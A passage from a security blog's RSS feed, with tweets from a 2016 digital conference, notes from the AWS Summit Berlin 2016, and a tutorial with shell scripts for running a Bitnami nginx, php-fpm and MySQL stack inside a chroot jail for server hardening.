<blockquote style="width: 900px;" class="twitter-tweet" data-theme="dark" data-width="600" data-partner="tweetdeck"><p lang="en" dir="ltr">Now <a href="https://twitter.com/jenniferchayes">@jenniferchayes</a> talka about networks at <a href="https://twitter.com/hashtag/sciencematch?src=hash">#sciencematch</a> <a href="https://t.co/MPGAe2wubO">pic.twitter.com/MPGAe2wubO</a></p>&mdash; lollo rosso (@XMasColara) <a href="https://twitter.com/XMasColara/status/730364694234423297">May 11, 2016</a></blockquote>
<blockquote class="twitter-tweet" data-partner="tweetdeck"><p lang="en" dir="ltr">&quot;everywhere we look we see networksâ€œ <a href="https://twitter.com/jenniferchayes">@jenniferchayes</a> no wonder things described as networks all seem similar <a href="https://twitter.com/hashtag/sciencematch?src=hash">#sciencematch</a> <a href="https://twitter.com/hashtag/Digitalisierung?src=hash">#Digitalisierung</a></p>&mdash; Martin Schmitt (@aberehrlich) <a href="https://twitter.com/aberehrlich/status/730365874566250496">May 11, 2016</a></blockquote>
<h1 id="links">Links</h1>
<ul>
<li><a href="http://mediathek.rbb-online.de/tv/zibb/Digital-future-conference-in-Berlin/rbb-Fernsehen/Video?documentId=35273096&amp;topRessort=tv&amp;bcastId=3822084">Digital future conference in Berlini (video)</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>AWS Summit in Berlin 2016</title>
      <link>https://blog.dornea.nu/2016/04/12/aws-summit-in-berlin-2016/</link>
      <pubDate>Tue, 12 Apr 2016 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2016/04/12/aws-summit-in-berlin-2016/</guid>
      <content:encoded><![CDATA[<p><img src="/posts/img/2016/670b3b02c8945633d069ba2ecd353870.jpg" alt="AWS Summit 2016 in Berlin"></p>
<p>For the first time I&rsquo;ve attended the <a href="https://aws.amazon.com/de/campaigns/summit2016/">AWS Summit in Berlin</a> which against my expectations was very interesting. Not having much in common with
AWS (at least not yet), from a <a href="http://blog.dornea.nu/tag/security/">security</a> perspective the cloud still remains a very neglected threat to companies. As we all know there is some &ldquo;rain&rdquo;
coming down from the cloud  from time to time. And by &ldquo;rain&rdquo; I mean sensitive data which gets exposed due to misconfigured APIs, weak credentials or
<strong>insecure</strong> applications.</p>
<p><img src="/posts/img/2016/de3a6b18a864216637b801f9c11bd138.jpg" alt="AWS Summit 2016 Berlin"></p>
<p><img src="/posts/img/2016/80864ceb309319c31cad519e8e52f8e0.jpg" alt="AWS Summit 2016 Berlin"></p>
<h2 id="cloud-trends">Cloud trends</h2>
<p>In this years keynote <a href="https://twitter.com/werner">Dr. Werner &hellip;</a> pointed out <strong>why</strong> everybody is moving into the cloud and <strong>how</strong> they do it. But most important
he talked about <strong>trends</strong> the digital world is facing at nowadays. Among these I&rsquo;d like to list some.</p>
<h3 id="data-explosion">Data explosion</h3>
<ul>
<li>the amount of data every company is generating or collecting is <strong>huge</strong></li>
<li>everybody wants to <strong>analyze</strong> data and get some valuable information related to their business</li>
<li>data type depends on business case, so you might want to store media files differently as you would do with customer data for example</li>
<li>the need for a DB as a service inside the cloud is increasing</li>
<li>Amazon has <a href="https://aws.amazon.com/rds/aurora/details/">AWS Aurora</a> which is a MySQL based DB optimized for performance and high scalability</li>
</ul>
<h3 id="data-warehouse-everywhere">Data warehouse everywhere</h3>
<ul>
<li>people <strong>need</strong> to analyze data in <strong>real-time</strong></li>
<li>smart automatic data analysis helps you understand your data</li>
<li><a href="http://docs.aws.amazon.com/redshift/latest/mgmt/welcome.html">AWS Redshift</a> is <strong>the</strong> data warehouse you may want to use</li>
</ul>
<h3 id="analytics">Analytics</h3>
<ul>
<li>based on the available data people want to do data analysis with real-time input</li>
<li>people also want to make predictions how their business might evolve based on data generated in the past</li>
</ul>
<h3 id="different-ways-to-compute-things">Different ways to compute things</h3>
<ul>
<li>depending where you want and how you want to serve your application, people choose different ways to <strong>run</strong> their application</li>
<li>you might choose between:
<ul>
<li>virtual machines</li>
<li>containers (yes, docker again)</li>
<li>functions (<a href="https://aws.amazon.com/lambda/details/">AWS Lambda</a> which IMHO is very powerful)</li>
</ul>
</li>
</ul>
<h3 id="deep-security-everwhere">Deep security everwhere</h3>
<ul>
<li>when Werner talked about security he tried to separate layers security can be applied to</li>
<li>in general there is this thing &ldquo;move fast vs stay secure&rdquo;</li>
<li>AWS does have some security:
<ul>
<li>network separation</li>
<li>default data encryption</li>
<li>compliance rules that can be applied to ressources</li>
</ul>
</li>
</ul>
<h3 id="everything-is-mobile">Everything is mobile</h3>
<ul>
<li>mobile clients dominate the market</li>
<li>there is a need for developers to test their apps against as many devices as possible</li>
<li>using <a href="https://aws.amazon.com/device-farm/">AWS Device Farm</a> the developers can choose from a variety of devices to test the app against</li>
<li><a href="https://aws.amazon.com/mobile/">AWS Mobile Hub</a> helps you automate to app development process in the cloud</li>
</ul>
<h3 id="everything-is-connected">Everything is connected</h3>
<ul>
<li>yes, <a href="https://en.wikipedia.org/wiki/Internet_of_Things">IoT</a> is indeed a threat</li>
<li>there are a lot of <a href="https://en.wikipedia.org/wiki/Industry_4.0">Industry 4.0</a> companies using the cluod to aggregate data from <em>sensors</em> and control the <em>actors</em></li>
</ul>
<h3 id="hybrid">Hybrid</h3>
<ul>
<li>&ldquo;make the best of both worlds&rdquo;</li>
</ul>
<h2 id="security">Security</h2>
<p>As previously mentioned, the main goal was to identify main security threats in the cloud architecture. <a href="https://www.linkedin.com/in/dave-walker-5b4194">Dave Walker</a> had an excellent talk about <a href="http://aws-de-media.s3.amazonaws.com/images/AWS_Summit_Berlin_2016/sessions/pushing_the_boundaries_1350_securing_serverless_architectures.pdf">Securing serverless architectures</a>. Driven by &ldquo;<em>bad things could happen, when people get creative</em>&rdquo; operational security is being taken seriously inside AWS. A few attack vectors were shown and the corresponding countermeasures. In general he distinguished between different layers:</p>
<ul>
<li>application layer
<ul>
<li>several security were taken to secure applications in general:
<ul>
<li>use TLS 1.2</li>
<li>own implementation of TLS/SSL: <a href="https://github.com/awslabs/s2n">s2n</a></li>
<li>use of <a href="http://docs.aws.amazon.com/general/latest/gr/signature-version-4.html">Sigv4</a> for authenticating AWS requests</li>
</ul>
</li>
</ul>
</li>
<li>API
<ul>
<li>this also includes the <a href="https://aws.amazon.com/api-gateway/">AWS API Gateway</a></li>
</ul>
</li>
<li>in-band attacks
<ul>
<li><strong>DoS</strong>ing the AWS components</li>
</ul>
</li>
<li>cross-account access
<ul>
<li>read more in <a href="https://aws.amazon.com/blogs/aws/new-cross-account-access-in-the-aws-management-console/">Cross-Account Access in the AWS Management Console</a></li>
<li>more details at the <a href="https://aws.amazon.com/events/security-week-2016/">AWS Security Roadshow</a> this year but I couldn&rsquo;t find any materials on that</li>
</ul>
</li>
<li>lambda functions
<ul>
<li>functions applied to user-supplied input</li>
<li>read more in <a href="https://aws.amazon.com/lambda/faqs/#security">AWS Lambda - Security and Control</a></li>
</ul>
</li>
</ul>
<h2 id="use-cases">Use cases</h2>
<p>Among some (Siemens, Air Berlin, ProSiebenSat1, Dubsmash) companies already using AWS, I&rsquo;ve really enjoyed <strong>Air Berlin</strong> talk where <strong>Michael Ruplitsch</strong> talked about their process moving stuff into the cloud:</p>
<ul>
<li>
<p>motivation</p>
<ul>
<li>competition</li>
<li>cost efficiency</li>
<li>new distribution channels
<ul>
<li>personalized flight search</li>
<li>digital transformation</li>
</ul>
</li>
</ul>
</li>
<li>
<p>lessons learned</p>
<ul>
<li>do not understimate the &ldquo;cloud migration&rdquo;</li>
<li>educate and train involved parties</li>
<li>plan or confirm concept with AWS approved partner</li>
<li>take care of governence, change and release management</li>
<li>cross monitoring</li>
</ul>
</li>
</ul>
<h3 id="berliner-philarmoniker">Berliner Philarmoniker</h3>
<p><img src="/posts/img/2016/6a1f993a91fc78d7ce549d1088099ddc.jpg" alt="AWS Use Cases"></p>
<h3 id="bitdefener">BitDefener</h3>
<p><img src="/posts/img/2016/8b55bd58d7fc270537f738ed335f9d79.jpg" alt="AWS Use Cases"></p>
<h3 id="soundcloud">SoundCloud</h3>
<p><img src="/posts/img/2016/8d8d673196bc5b15765f94e8799432b8.jpg" alt="AWS Use Cases"></p>
<h2 id="microservices">Microservices</h2>
<p>Since AWS seems to love <strong>microservices</strong> , <a href="http://aws-de-media.s3.amazonaws.com/images/AWS_Summit_Berlin_2016/sessions/pushing_the_boundaries_1300_microservices_on_aws.pdf">Microservices on AWS</a> was a really nice introduction. Implementing your own microservice and bringing it to the cloud, was then presented by <a href="https://twitter.com/julsimon">Julien Simon</a> in <a href="http://www.slideshare.net/JulienSIMON5/amazon-ecs-january-2016">Clustering Docker on AWS with Amazon ECR &amp; ECS</a>.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Chrooting nginx, php-fpm and mysql using Bitnami </title>
      <link>https://blog.dornea.nu/2016/02/12/chrooting-nginx-php-fpm-and-mysql-using-bitnami/</link>
      <pubDate>Fri, 12 Feb 2016 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2016/02/12/chrooting-nginx-php-fpm-and-mysql-using-bitnami/</guid>
      <content:encoded><![CDATA[<p>Having talked about hardening your server using <code>chroot</code> in a <a href="http://blog.dornea.nu/2016/01/15/howto-put-nginx-and-php-to-jail-in-debian-8">previous post</a> I&rsquo;ve felt that the whole process was way to complicated. I wanted to have a more <strong>generic</strong> solution regardless of the operating system (and especially the Linux distro). Besides that I wasn&rsquo;t quite happy changing the systems <code>systemd</code> settings and do several modifications to the already <strong>running</strong> system. What I wanted to achieve was a <strong>closed</strong>, <strong>portable</strong> system of running applications inside a <code>chroot</code> environment.</p>
<p>And then I&rsquo;ve remembered using some <a href="https://bitnami.com">bitnami</a> applications in the past. You can either run them in the <em>cloud</em>, in a <em>virtual machine</em> or install them <strong>locally</strong>. The <em>local</em> installation will install a whole software <a href="https://bitnami.com/stacks">stack</a> inside a directory (<em>closed</em> system). You can then start the whole stack using <em>shell scripts</em>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ./ctlscript.sh <span style="color:#24909d">help</span>
usage: ./ctlscript.sh <span style="color:#24909d">help</span>
       ./ctlscript.sh (start|stop|restart|status)
       ./ctlscript.sh (start|stop|restart|status) mysql
       ./ctlscript.sh (start|stop|restart|status) php-fpm
       ./ctlscript.sh (start|stop|restart|status) nginx

<span style="color:#24909d">help</span>       - this screen
start      - start the service(s)
stop       - stop  the service(s)
restart    - restart or start the service(s)
status     - show the status of the service(s)
</code></pre></div><p>The binaries inside the stack are using <strong>libraries</strong> inside the <em>closed</em> system (by changing <code>LD_LIBRARY_PATH</code>). So the Bitnami installation will run out of the stack without interacting with the underlying operating system (read more about the technology <a href="https://bitnami.com/learn_more">here</a>). This is a great advantage since you can simply <strong>copy</strong> the directory, change the <strong>settings</strong> and you&rsquo;ll have another instance running in its own directory (remember the <strong>portable</strong> aspect of my wish list before?)</p>
<p>However the Bitnami stacks won&rsquo;t use <code>chroot</code> by default. This is where I had to commit my own modifications to the local installation. But, one thing after another.</p>
<h2 id="the-nginx-stack">The Nginx stack</h2>
<p>If you&rsquo;re recalling the <a href="http://blog.dornea.nu/2016/01/15/howto-put-nginx-and-php-to-jail-in-debian-8">previous post</a>, my <code>chroot</code> environment consisted of: <code>nginx</code>, <code>php-fpm</code> and <code>mysql</code>. Fortunately Bitnami provides a <a href="https://bitnami.com/stack/nginx">Nginx Stack</a> which is a:</p>
<blockquote>
<p>&ldquo;&hellip; complete,  fully-integrated and ready to run PHP, MySQL and Nginx development environment. In addition, it bundles phpMyAdmin, SQLite, ImageMagick, FastCGI, Memcache, GD, CURL, PEAR, PECL and other components. Also known as LEMP for Linux, WEMP for Windows and MEMP for OS X.&rdquo; (Source: <a href="https://bitnami.com/stack/nginx">https://bitnami.com/stack/nginx</a>)</p>
</blockquote>
<p>So let&rsquo;s give it a try.</p>
<h2 id="installing-bitnami-nginx-stack">Installing Bitnami Nginx stack</h2>
<p>Download the <a href="https://bitnami.com/stack/nginx/installer">installer</a> to your machine and run it:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># ./bitnami-nginxstack-1.9.10-0-linux-x64-installer.run 
----------------------------------------------------------------------------
Welcome to the Bitnami Nginx Stack Setup Wizard.

----------------------------------------------------------------------------
Select the components you want to install; clear the components you do not want 
to install. Click Next when you are ready to continue.

Varnish [Y/n] :n

PhpMyAdmin : Y (Cannot be edited)

Is the selection above correct? [Y/n]: Y

----------------------------------------------------------------------------
Installation folder

Please, choose a folder to install Bitnami Nginx Stack

Select a folder [/opt/nginxstack-1.9.10-0]: /home/bitnami/nginxstack

----------------------------------------------------------------------------
Create MySQL &#39;root&#39; Account

Bitnami Nginx Stack database root user creation

Password :
Re-enter :
----------------------------------------------------------------------------
MySQL Information

Please enter your MySQL database information:

MySQL Server port [3306]: 3307 

----------------------------------------------------------------------------
Please enter the port that the bundled Nginx Server will listen to by default.

Nginx Port [80]: 8080

----------------------------------------------------------------------------
Setup is now ready to begin installing Bitnami Nginx Stack on your computer.

Do you want to continue? [Y/n]: Y

----------------------------------------------------------------------------
Please wait while Setup installs Bitnami Nginx Stack on your computer.

 Installing
 0% ______________ 50% ______________ 100%
 #########################################

----------------------------------------------------------------------------
Setup has finished installing Bitnami Nginx Stack on your computer.

Launch Bitnami Nginx Stack [Y/n]: n
</code></pre></div><p>A few observations:</p>
<ul>
<li>I&rsquo;ve installed the stack to <code>/home/bitnami/nginxstack</code></li>
<li><code>MySQL</code> will listen on <code>localhost:3307</code></li>
<li><code>nginx</code> will listen on <code>localhost:8080</code></li>
</ul>
<h2 id="setup-chroot-environment">Setup chroot environment</h2>
<p>Now that we have installed the <em>nginx stack</em>, we&rsquo;ll setup a <code>chroot</code> environment and copy the <em>nginx stack directory</em> to it. Supposing that the chroot will be located at <code>/home/bitnami/nginxstack-chroot</code>, inside the chroot we&rsquo;ll have following directory structure:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ tree -L <span style="color:#3677a9">3</span>
.
|-- bin
|-- dev
|   |-- null
|   |-- random
|    -- urandom
|-- etc
|   ...
|-- home
|   -- bitnami
|       -- nginxstack
|-- lib
|   ...
|-- lib64 -&gt; usr/lib
|-- run
|-- tmp
|-- usr
|   ...
|-- var
    ...
</code></pre></div><p>So the nginx stack directory will be available at <code>/home/bitnami/nginxstack-chroot/home/bitnami/nginxstack</code>. This is <strong>very important</strong> and you should take care having the same structure. Let&rsquo;s setup the chroot using following script:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#cd2828;font-weight:bold">#!/bin/bash
</span><span style="color:#cd2828;font-weight:bold"></span>
<span style="color:#24909d">export</span> <span style="color:#40ffff">N2CHROOT</span>=/home/bitnami/scripts/n2chroot
<span style="color:#24909d">export</span> <span style="color:#40ffff">JAIL</span>=/home/bitnami/nginxstack-chroot
<span style="color:#24909d">export</span> <span style="color:#40ffff">BITNAMI</span>=/home/bitnami/nginxstack
<span style="color:#24909d">export</span> <span style="color:#40ffff">BITNAMI_INSTALLDIR</span>=<span style="color:#40ffff">$JAIL</span>/<span style="color:#40ffff">$BITNAMI</span>

<span style="color:#6ab825;font-weight:bold">function</span> create_chroot {
    <span style="color:#999;font-style:italic"># Create devices</span>
    mkdir <span style="color:#40ffff">$JAIL</span>/dev
    mknod -m <span style="color:#3677a9">0666</span> <span style="color:#40ffff">$JAIL</span>/dev/null c <span style="color:#3677a9">1</span> <span style="color:#3677a9">3</span>
    mknod -m <span style="color:#3677a9">0666</span> <span style="color:#40ffff">$JAIL</span>/dev/random c <span style="color:#3677a9">1</span> <span style="color:#3677a9">8</span>
    mknod -m <span style="color:#3677a9">0444</span> <span style="color:#40ffff">$JAIL</span>/dev/urandom c <span style="color:#3677a9">1</span> <span style="color:#3677a9">9</span>

    <span style="color:#999;font-style:italic"># Create directories</span>
    mkdir -p <span style="color:#40ffff">$JAIL</span>/{etc,bin,usr,var}
    mkdir -p <span style="color:#40ffff">$JAIL</span>/usr/{lib,sbin,bin}
    mkdir -p <span style="color:#40ffff">$JAIL</span>/{run,tmp}
    mkdir -p <span style="color:#40ffff">$JAIL</span>/var/run
    mkdir -p <span style="color:#40ffff">$JAIL</span>/<span style="color:#40ffff">$BITNAMI</span>/{php,nginx,mysql}
    mkdir -p <span style="color:#40ffff">$JAIL</span>/<span style="color:#40ffff">$BITNAMI</span>/php/lib
    mkdir -p <span style="color:#40ffff">$JAIL</span>/<span style="color:#40ffff">$BITNAMI</span>/nginx/lib
    mkdir -p <span style="color:#40ffff">$JAIL</span>/<span style="color:#40ffff">$BITNAMI</span>/common/lib
    mkdir -p <span style="color:#40ffff">$JAIL</span>/<span style="color:#40ffff">$BITNAMI</span>/mysql/lib
    
    <span style="color:#999;font-style:italic"># Check if 64-bit system</span>
    <span style="color:#6ab825;font-weight:bold">if</span> [ <span style="color:#6ab825;font-weight:bold">$(</span>uname -m<span style="color:#6ab825;font-weight:bold">)</span> = <span style="color:#ed9d13">&#34;x86_64&#34;</span> ]; <span style="color:#6ab825;font-weight:bold">then</span>
        mkdir -p <span style="color:#40ffff">$JAIL</span>/lib/x86_64-linux-gnu
        <span style="color:#24909d">cd</span> <span style="color:#40ffff">$JAIL</span>; ln -s usr/lib lib64
        <span style="color:#24909d">cd</span> <span style="color:#40ffff">$JAIL</span>/usr; ln -s lib lib64
    <span style="color:#6ab825;font-weight:bold">else</span>
        <span style="color:#24909d">cd</span> <span style="color:#40ffff">$JAIL</span>; ln -s usr/lib lib
    <span style="color:#6ab825;font-weight:bold">fi</span>

    <span style="color:#999;font-style:italic"># Copy important stuff</span>
    cp -rfvL /etc/{services,localtime,nsswitch.conf,nscd.conf,protocols,hosts,ld.so.cache,ld.so.conf,resolv.conf,host.conf} <span style="color:#40ffff">$JAIL</span>/etc

    <span style="color:#999;font-style:italic"># Cp bitnami to the chroot</span>
    <span style="color:#999;font-style:italic"># cp -Rv $BITNAMI $JAIL/home/bitnami/ </span>
}

<span style="color:#6ab825;font-weight:bold">function</span> add_users {
    <span style="color:#999;font-style:italic"># Most instructions from https://wiki.archlinux.org/index.php/nginx#Installation_in_a_chroot</span>
    <span style="color:#999;font-style:italic"># Add users</span>
    <span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#34;daemon:x:1:1:daemon:/:/bin/false&#34;</span> &gt;&gt; <span style="color:#40ffff">$JAIL</span>/etc/passwd
    <span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#34;mysql:x:100:101:MySQL Server,,,:/nonexistent:/bin/false&#34;</span> &gt;&gt; <span style="color:#40ffff">$JAIL</span>/etc/passwd
    <span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#34;nobody:x:99:99:nobody:/:/bin/false&#34;</span> &gt;&gt; <span style="color:#40ffff">$JAIL</span>/etc/passwd


    <span style="color:#999;font-style:italic"># Add groups</span>
    <span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#34;daemon:x:1:&#34;</span> &gt;&gt; <span style="color:#40ffff">$JAIL</span>/etc/group
    <span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#34;mysql:x:101:&#34;</span> &gt;&gt; <span style="color:#40ffff">$JAIL</span>/etc/group
    <span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#34;nobody:x:99:&#34;</span> &gt;&gt; <span style="color:#40ffff">$JAIL</span>/etc/group

    <span style="color:#999;font-style:italic"># Add shadow</span>
    <span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#34;daemon:x:14871::::::&#34;</span> &gt;&gt; <span style="color:#40ffff">$JAIL</span>/etc/shadow
    <span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#34;mysql:!:16755:0:99999:7:::&#34;</span> &gt;&gt; <span style="color:#40ffff">$JAIL</span>/etc/shadow
    <span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#34;nobody:x:14871::::::&#34;</span> &gt;&gt; <span style="color:#40ffff">$JAIL</span>/etc/shadow

    <span style="color:#999;font-style:italic"># Add gshadow</span>
    <span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#34;daemon:::&#34;</span> &gt;&gt; <span style="color:#40ffff">$JAIL</span>/etc/gshadow
    <span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#34;mysql:!::&#34;</span> &gt;&gt; <span style="color:#40ffff">$JAIL</span>/etc/gshadow
    <span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#34;nobody:::&#34;</span> &gt;&gt; <span style="color:#40ffff">$JAIL</span>/etc/gshadow
}

<span style="color:#6ab825;font-weight:bold">function</span> add_libraries {
    <span style="color:#999;font-style:italic"># Add system stuff</span>
    cp /lib/x86_64-linux-gnu/libnsl* <span style="color:#40ffff">$JAIL</span>/lib/x86_64-linux-gnu/
    cp /lib/x86_64-linux-gnu/libnss* <span style="color:#40ffff">$JAIL</span>/lib/x86_64-linux-gnu/
    
    <span style="color:#999;font-style:italic"># Add nginx stuff</span>
    <span style="color:#999;font-style:italic"># $N2CHROOT $BITNAMI_INSTALLDIR/nginx/sbin/.nginx.bin</span>
    cp /lib/x86_64-linux-gnu/libnsl* <span style="color:#40ffff">$BITNAMI_INSTALLDIR</span>/common/lib/
    cp /lib/x86_64-linux-gnu/libnss* <span style="color:#40ffff">$BITNAMI_INSTALLDIR</span>/common/lib/
    cp /lib/x86_64-linux-gnu/libpthread* <span style="color:#40ffff">$BITNAMI_INSTALLDIR</span>/common/lib/
    cp /lib/x86_64-linux-gnu/libpcre* <span style="color:#40ffff">$BITNAMI_INSTALLDIR</span>/common/lib/
    cp /lib/x86_64-linux-gnu/libdl* <span style="color:#40ffff">$BITNAMI_INSTALLDIR</span>/common/lib/
    cp /lib/x86_64-linux-gnu/libgcc* <span style="color:#40ffff">$BITNAMI_INSTALLDIR</span>/common/lib/
    cp /lib/x86_64-linux-gnu/libresolv* <span style="color:#40ffff">$BITNAMI_INSTALLDIR</span>/common/lib/

    <span style="color:#999;font-style:italic"># Add php-fpm stuff</span>
    <span style="color:#24909d">cd</span> <span style="color:#40ffff">$BITNAMI_INSTALLDIR</span>/php/lib
    ln -s ../../common/lib/libresolv.so.2 

    <span style="color:#999;font-style:italic"># Add mysql stuff</span>
    <span style="color:#24909d">cd</span> <span style="color:#40ffff">$BITNAMI_INSTALLDIR</span>/mysql/lib
    ln -s ../../common/lib/libdl.so.2
    ln -s ../../common/lib/libgcc_s.so.1 
    ln -s ../../common/lib/libpthread.so.0 
}

<span style="color:#6ab825;font-weight:bold">function</span> add_binaries {
    <span style="color:#999;font-style:italic"># Add shell</span>
    cp /bin/sh <span style="color:#40ffff">$JAIL</span>/bin/
    <span style="color:#40ffff">$N2CHROOT</span> /bin/sh

    <span style="color:#999;font-style:italic"># Add nohup (mysqld needs it)</span>
    cp /usr/bin/nohup <span style="color:#40ffff">$JAIL</span>/usr/bin
}

<span style="color:#6ab825;font-weight:bold">function</span> fix_permissions {
    <span style="color:#24909d">cd</span> <span style="color:#40ffff">$BITNAMI_INSTALLDIR</span>/mysql
    chown -R mysql:mysql .

    <span style="color:#24909d">cd</span> <span style="color:#40ffff">$BITNAMI_INSTALLDIR</span>/php
    chown -R daemon:daemon .

    <span style="color:#24909d">cd</span> <span style="color:#40ffff">$BITNAMI_INSTALLDIR</span>/nginx
    chown -R daemon:daemon .
}

<span style="color:#999;font-style:italic"># Run functions</span>
create_chroot
add_users
add_libraries
add_binaries
fix_permissions

</code></pre></div><p>The <code>N2CHROOT</code> script can be found <a href="https://gist.github.com/dorneanu/9f940b2ded9c05b5be9f#file-n2chroot">here</a>. Make sure it&rsquo;s located inside <code>/home/bitnami/scripts</code> and also change the <code>BASE</code> variable inside the script to <code>/home/bitnami/nginxstack-chroot</code>.  Now <a href="https://gist.github.com/dorneanu/9f940b2ded9c05b5be9f#file-nginx-chroot-bitnami">download</a> the script and run it:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ <span style="color:#24909d">export</span> <span style="color:#40ffff">JAIL</span>=/home/bitnami/nginxstack-chroot
$ <span style="color:#24909d">cd</span> <span style="color:#40ffff">$JAIL</span>
$ ../scripts/nginx-chroot-bitnami.sh
...
</code></pre></div><p>Now you should have following structure:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ tree -L <span style="color:#3677a9">3</span>
.
|-- bin
|    -- sh
|-- dev
|   |-- null
|   |-- random
|    -- urandom
|-- etc
|   |-- group
|   |-- gshadow
|   |-- host.conf
|   |-- hosts
|   |-- ld.so.cache
|   |-- ld.so.conf
|   |-- localtime
|   |-- nsswitch.conf
|   |-- passwd
|   |-- protocols
|   |-- resolv.conf
|   |-- services
|    -- shadow
|-- home
|    -- bitnami
|        -- nginxstack
|-- lib
|    -- x86_64-linux-gnu
|       |-- libc.so.6
|       |-- libcrypt.so.1
|       |-- libm.so.6
|       |-- libpthread.so.0
|        -- librt.so.1
|-- lib64 -&gt; usr/lib
|-- run
|-- tmp
|-- usr
|   |-- bin
|   |-- lib
|   |   |-- ld-linux-x86-64.so.2
|   |    -- x86_64-linux-gnu
|   |-- lib64 -&gt; lib
|    -- sbin
 -- var
     -- run
</code></pre></div><p>Since all config files created by the bitnami installer point to <code>/home/bitnami/nginxstack</code> I will create a new <strong>link</strong> to point to the right directory inside the <code>chroot</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ <span style="color:#24909d">cd</span> /home/bitnami
$ ln -s nginxstack-chroot/home/bitnami/nginxstack nginxstack
</code></pre></div><p><strong>This is very important</strong>, since all daemons (nginx, php-fpm, mysqld) will look at <code>/home/bitnami/nginxstack</code> for their config files etc. before entering the <code>chroot</code>.</p>
<h2 id="patch-scripts">Patch scripts</h2>
<p>Now the <strong>controll scripts</strong> have to be modified to run the binaries in a <code>chroot</code>.</p>
<h3 id="patch-setenvsh">Patch setenv.sh</h3>
<p>At <code>/home/bitnami/nginxstack/scripts/setenv.sh</code> (inside the <code>chroot</code>) there is a script which sets all the environment variables (e.g. <code>LD_LIBRARY_PATH</code>) for the binaries. We&rsquo;ll use this script to set a variable which we&rsquo;ll use a few times in some other scripts. At the beginning of the script set the <code>JAIL</code> variable accordingly:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#cd2828;font-weight:bold">#!/bin/sh
</span><span style="color:#cd2828;font-weight:bold"></span><span style="color:#24909d">export</span> <span style="color:#40ffff">JAIL</span>=/home/bitnami/nginxstack-chroot

[...]
</code></pre></div><h3 id="patch-nginx-control-script">Patch nginx control script</h3>
<p>When calling <code>./ctlscript.sh start nginx</code> the script will then call <code>./nginx/scripts/ctl.sh</code> and finally this will call <code>./nginx/sbin/nginx</code>. The last contains the commands for calling the <code>nginx</code> binary directly. You&rsquo;ll have sth like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#cd2828;font-weight:bold">#!/bin/sh
</span><span style="color:#cd2828;font-weight:bold"></span>
. /home/bitnami/nginxstack/scripts/setenv.sh

<span style="color:#24909d">exec</span> /home/bitnami/nginxstack/nginx/sbin/.nginx.bin -p /home/bitnami/nginxstack/nginx/ <span style="color:#ed9d13">&#34;</span><span style="color:#40ffff">$@</span><span style="color:#ed9d13">&#34;</span>
</code></pre></div><p>Now we want the <code>nginx</code> binary to run inside the <code>chroot</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#cd2828;font-weight:bold">#!/bin/sh
</span><span style="color:#cd2828;font-weight:bold"></span>
. /home/bitnami/nginxstack/scripts/setenv.sh

<span style="color:#24909d">exec</span> /usr/sbin/chroot <span style="color:#40ffff">$JAIL</span> /home/bitnami/nginxstack/nginx/sbin/.nginx.bin -p /home/bitnami/nginxstack/nginx/ <span style="color:#ed9d13">&#34;</span><span style="color:#40ffff">$@</span><span style="color:#ed9d13">&#34;</span>
</code></pre></div><p>Using almost the same command you can if <code>nginx</code> will run properly:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ /usr/sbin/chroot <span style="color:#40ffff">$JAIL</span> sh -c <span style="color:#ed9d13">&#39;LD_LIBRARY_PATH=&#34;/home/bitnami/nginxstack/sqlite/lib:/home/bitnami/nginxstack/nginx/lib:/home/bitnami/nginxstack/mysql/lib:/home/bitnami/nginxstack/common/lib&#34; /home/bitnami/nginxstack/nginx/sbin/.nginx.bin -t -p /home/bitnami/nginxstack/nginx&#39;</span>
nginx: the configuration file /home/bitnami/nginxstack/nginx/conf/nginx.conf syntax is ok
nginx: configuration file /home/bitnami/nginxstack/nginx/conf/nginx.conf <span style="color:#24909d">test</span> is successful

